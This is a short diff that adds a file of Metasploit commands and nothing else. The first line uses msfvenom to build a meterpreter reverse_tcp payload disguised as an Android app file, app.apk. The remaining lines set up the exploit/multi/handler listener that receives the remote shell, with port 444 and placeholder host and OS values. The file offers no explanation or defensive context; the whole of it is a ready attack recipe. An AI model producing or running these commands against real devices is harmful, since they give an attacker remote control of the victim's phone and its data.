@@ -1,0 +1,11 @@
+msfvenom -p <OS>/meterpreter/reverse_tcp lport=444 lhost=<dns> R > app.apk
+
+use exploit/multi/handler
+
+set payload <OS>/meterpreter/reverse_tcp
+
+set lport 444
+
+set lhost <ip>
+
+exploit
